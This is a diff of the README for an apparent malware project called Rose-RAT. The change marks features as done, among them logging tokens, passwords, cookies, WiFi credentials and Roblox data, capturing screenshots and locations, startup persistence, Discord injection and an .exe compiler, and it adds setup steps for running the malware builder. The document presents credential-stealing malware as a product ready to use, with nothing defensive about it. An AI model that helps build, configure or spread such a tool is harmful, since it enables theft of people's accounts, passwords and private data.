@@ -48,17 +48,18 @@
 - `Logs Token, Pc Info, Account Info and IP`🟢
 - `Logs passwords`🟢
 - `Logs cookies`🟢
-- `Wifi names and passwords logs`🟣
+- `Wifi names and passwords logs`🟢
+- `Roblox logs`🟢
 - `Logs Screenshot and locations info`🟢
-- `Start up integration`🟡
+- `Start up integration`🟣
 - `JS Injector on startup/actions`🟢
 - `Discord RAT`🟣
 - `UI with Qt5`🟢
-- `UI Integration`🟣
-- `Compiler (.exe)`🟡
+- `UI Integration`🟢
+- `Compiler (.exe)`🟢
 - `Make An Embebed Version`🟢
 - `Auto Update`🟡
-- `Safe Mode For Testing Purposes`🟡
+- `Safe Mode For Testing Purposes`🔴
 - `Discord Injection`🟢
 - `MacOS Adaptation`🔴
 - `CHANGELOD.md file`🟡
@@ -80,7 +81,12 @@ You can check [this](https://github.com/DamagingRose/Rose-RAT) for informations
 
 ### <a id="setup"></a> ⚙️ Setup
 
-FOR NOW, THE PROJECT IS NOT RELEASED AND IS ONLY UNDER A DEVELOPMENT RELEASE
+Don't forget that the project is still under development release and might contain bugs.
+
+* Download the repository
+* Download the requirements by entering `pip install -r requirements.txt`
+* Start rose_builder.py from the tools dir
+* Enjoy!
 
 ## <a id="preview"></a> 📷 〢 Preview
 
